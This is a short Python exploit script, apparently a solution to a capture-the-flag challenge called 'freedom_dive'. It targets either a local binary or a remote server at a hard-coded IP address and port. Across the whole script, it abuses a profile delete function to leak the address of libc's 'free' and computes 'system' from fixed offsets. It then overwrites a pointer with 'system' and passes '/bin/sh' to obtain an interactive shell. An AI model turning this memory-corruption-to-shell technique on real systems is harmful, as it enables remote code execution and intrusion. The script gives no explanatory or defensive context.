import pwnbox,struct
SERVER = True
d = lambda x : struct.unpack("<I",x)[0]
s = lambda x : struct.pack("<I",x)
if not SERVER:
  p = pwnbox.pipe.ProcessPipe("./freedom_dive_829FA6F15064F5251DA8BD2ABAC4D443A76648E2")
else:
  p = pwnbox.pipe.SocketPipe("45.32.38.83",25252)
def menu(): p.read_until("[Select menu]\n")
def input_name(n):
  p.read_until("\n")
  p.write(n+"\n")
def set_profile(name,des):
  menu()
  p.write("1\n")
  p.read_until("\n")
  p.write(name+"\n")
  p.read_until("\n")
  p.write(des+"\n")

def echo(data,get=False):
  menu()
  p.write("0\n")
  p.read_until("\n")
  p.write(data+"\n")
  p.read_until("\n")
  if get :return p.read_byte(0x100)


def delete():
  menu()
  p.write("4\n")
input_name("daramg")
set_profile("daramg","daramg")
set_profile("daramg","daramg")
delete()
free= d(echo("A"*(0xfc-1),True)[-4:])
if not SERVER:
  libc = free-0x00076c60
  system = libc +0x00040190
else:
  libc = free-0x000738a0
  system = libc +0x0003b180
print hex(libc)
payload = "/bin/sh\x00"
payload += "A"*(0xfc-len(payload))
payload += s(system)
echo(payload+"\n")
delete()
p.interact()
